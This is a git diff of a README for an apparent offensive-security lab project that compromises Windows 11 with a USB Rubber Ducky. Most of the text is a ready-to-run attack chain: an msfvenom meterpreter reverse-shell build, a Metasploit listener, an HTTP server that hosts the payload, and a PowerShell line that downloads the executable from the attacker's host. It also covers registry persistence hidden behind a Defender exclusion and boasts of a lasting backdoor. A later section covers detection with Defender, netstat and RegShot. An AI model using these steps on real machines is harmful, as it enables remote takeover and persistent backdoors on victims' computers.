@@ -1,6 +1,6 @@
 # Windows 11 Ducky PWN
 
-## *** Notice Educational Purposes Only ***
+## *** Educational Purposes Only ***
 
 ## Description 
 For this project I utilized a USB Rubber Ducky from Hak5 and the Kali Linux tools 'msfvenom', 'msfconsole', and 'meterpreter'. Through these tools I deployed a reverse shell, esatblished persistence, 
@@ -8,7 +8,7 @@ and cleaned up my suspicous activity. For my attacking machine I used Kali Linux
 features and maintain undetected persetence through the use of modifying the Default User's Windows Registers.
 
 ## Video Demo
-[![Watch the Demo](screenshot.png)](https://www.youtube.com/watch?v=YOUR_VIDEO_ID)
+[![Watch the Demo](https://i9.ytimg.com/vi/uH7h9ziv1Kg/mq1.jpg?sqp=CPj-h8AG-oaymwEmCMACELQB8quKqQMa8AEB-AHUBoAC4AOKAgwIABABGD4gVChlMA8=&rs=AOn4CLBKcuQagU35TL-V5jBWEWH2MJolEA)](https://youtu.be/uH7h9ziv1Kg)
 
 ## Walkthrough
 
@@ -20,8 +20,8 @@ features and maintain undetected persetence through the use of modifying the Def
 - NAT Network if using VM's (Need communication between VMS)
   
 ### Preparing Kali Machine
-#### Generate Payload
-- Use 'msfvenom' to genrate our malicous executable
+#### Generate Malicous Executeable (Reverse Shell)
+- Use 'msfvenom' to generate our malicous executable
 <pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > /home/x/Desktop/nice3.exe</pre>
 - LHOST is the IP adderess of our attacking machine that will act as the server to connect back to replace x.x.x.x with you machines IP
 - For /home/x/Desktop/nice3.exe replace x with your Kali Linux username eg /home/Meeps-Underflow/Desktop/nice3.exe
@@ -32,14 +32,16 @@ features and maintain undetected persetence through the use of modifying the Def
 #### Set Up Listener 
 - Open Terminal and use 'msfconsole' to start a Metasploit CLI
 <pre>msfconsole</pre>
-- Pass parameters for our listener
-<pre>use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
+- Start a exploit multi handler
+<pre>use exploit/multi/handler</pre>
+- Pass parameters to our listener
+- Replace LHOST x.x.x.x with the same IP you used to genrate the payload eg your Kali Machine IP
+<pre>set payload windows/meterpreter/reverse_tcp
 set LHOST x.x.x.x
 set LPORT 4444
-set ExitOnSession false
-exploit -j</pre>
-- Replace LHOST x.x.x.x with the same IP you used to genrate the payload eg your Kali Machine IP
+set ExitOnSession false</pre>
+- Start our listener 
+<pre>exploit -j</pre>
 
 ![image](https://github.com/user-attachments/assets/61c9f16f-d1d8-4629-9d16-55a5eeaef2d5)
 
@@ -48,13 +50,10 @@ exploit -j</pre>
 - We will use python3 to create this server on port 80
 - Make sure to 'cd' into the directory containing nice3.exe, for me it will be in Desktop
 <pre>cd Desktop/</pre>
+- Start HTTP server
 <pre>python3 -m http.server 80</pre>
 
 ![image](https://github.com/user-attachments/assets/6106ade6-483d-4833-9248-fda99cec063c)
-- If your curiosu what the actual website looks like you can visit 'x.x.x.x:80' where x.x.x.x is your Kali Machines IP
-
-![image](https://github.com/user-attachments/assets/4fe0322c-2ecb-42b0-920a-458d1c29f56f)
-
 
 ### Preparing USB Rubber Ducky
 #### Download Repository 
@@ -63,17 +62,17 @@ exploit -j</pre>
 
 ![image](https://github.com/user-attachments/assets/41f03a31-1c7d-4f81-bc8d-e35bf957e0db)
 
-#### Convert Ducky Script to .bin
+#### Convert Ducky to Payload
 - Visit [Hak5 Payload Studio](https://payloadstudio.hak5.org/community/) follow the introduction and when prompted choose USB Rubber Ducky as your device
 - Click File -> Open/Import -> Upload File -> Locate your win11_ducky_pwn.txt file -> Upload
 - Take a moment to read over code to undersatnd what is happening
-- Change line 63 x.x.x.x to Kali Machine IP eg the http server holding nice3.exe
+- Change line 63 x.x.x.x to HTTP server's IP
 <pre>STRING powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/nice3.exe', 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\nice3.exe')"
 </pre>
-- Generate Payload
-- Download inject.bin ** Don't change name **
+- Click Generate Payload
+- Click Download ** Don't change name of inject.bin **
 
-#### Load USB Rubber Ducky With Payload
+#### Load Payload Into USB Rubber Ducky
 - Plug in your USB Rubber Ducky make sure it is not in attack mode
 - Open 'Ducky'
 - Move inject.bin from 'Downloads' into 'Ducky'
@@ -89,22 +88,20 @@ exploit -j</pre>
 
 ![image](https://github.com/user-attachments/assets/24ca4ef9-af40-4bb9-89f8-75cdd84c8e42)
 
-- Ensure all default security features in 'Exploit Protection' are enabled
-
 #### Deploying the Duck
 - Now that yor Windows Machine is up and running and you have confirmed all the secuirty features you wish to confirm its time to deploy the duck
 - Plug in your USB Rubber Ducky into your Windows 11 Machine and sit back and watch
 - After execution is complete go back to your Kali Machine and go to the Terminal that has the msf6 session
-- You shhoul see that we now have a successful reverse TCP connection with our victim
+- You should see that we now have a successful reverse TCP connection with our victim
 
 ![image](https://github.com/user-attachments/assets/34d67397-1a26-46dd-8a3f-12d755640302)
 
-- In order to interact with the session do
+- In order to interact with the session run
 <pre>sessions -i n</pre>
 - Where n is the session id 
-- Lets start a shell to see that we truly have access to the victims machine
+- Start a windows shell 
 <pre>shell</pre>
-- And run a simple windows cmd command to see whats going on 'ipconfig'
+- Run a simple windows cmd command to confirm exepected output 'ipconfig'
 
 ![image](https://github.com/user-attachments/assets/d32db17a-d28e-4af9-839e-c3fa07cfb151)
 
@@ -121,12 +118,13 @@ exploit -j</pre>
 
 ![image](https://github.com/user-attachments/assets/8a118ee2-7306-491e-8171-d7c86d8c8cd9)
 
-- As you can see a new session was created from the machine we previusly exploited verifying that our persestence works
+- As you can see a new session was created from the machine we previously exploited verifying that our persestence works
+- As long as thr Malware remains undetected we will always have a backdoor into the machine so longa s our listener is running and the victim in connected to the internet
 
-#### Test Microsoft Defender Scan
+### Detection
 - Lets now test to see if Microsoft Defender quick scan can detect our malware
 
-##### Test 1
+#### Quick Scan 1
 - First we will run quick scan 
 
 ![image](https://github.com/user-attachments/assets/bc4072f0-1f59-4356-83ff-1b6171eb1114)
@@ -136,8 +134,40 @@ exploit -j</pre>
 ![image](https://github.com/user-attachments/assets/cc789579-199e-48be-ba83-c845ec55c1e0)
 
 
-##### Test 2
-- Now lets remove that exclusion on the C drive and run a quick scan again to see if that finds our malware
+#### Quick Scan 2
+- Remove C Drive Exculsion
+- Restart VM or Run quick Scan again both should catch and remove Malware
+![image](https://github.com/user-attachments/assets/45e13e3c-cc52-4c08-acd1-03d00d039de9)
+
+- As seen above after removing the exclusion on the C drive the Malware was detected
+- Taking action will remove the Malware and terminate our current session
+- Looking back at our meterpreter shell we will see the sessions has been killed as well as persistence
+
+![image](https://github.com/user-attachments/assets/729b0b34-703e-4fa8-99e1-bdb1865dc498)
+
+#### Netstat 
+- Assume we didnt remove our exclusion and the Malware was actively running with a TCP connection
+- Netstat checks for unusual or unauthorized network connections.
+<pre>netstat -ano</pre>
+![image](https://github.com/user-attachments/assets/da31277d-17cd-4ce7-bd19-07d24a676753)
+- As seen above we can find a suspicous TCP connection with an unknown ip adderess and a suspicous port with the associate PID
+
+#### RegShot
+- We can use regshot to take a snapshot of our registries before the malware was executed and then another after to compare with and see any differneces
+
+![image](https://github.com/user-attachments/assets/25774496-b56c-40bf-84da-725e742476d3)
+- It takes a bit of reading but eventually you will come across the suspicous registry edit where now we can manually remove the malware and fix our registry
+
+
+## Disclaimer
+
+This project is intended for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.
+
+
+
+  
+
+
 
 
 
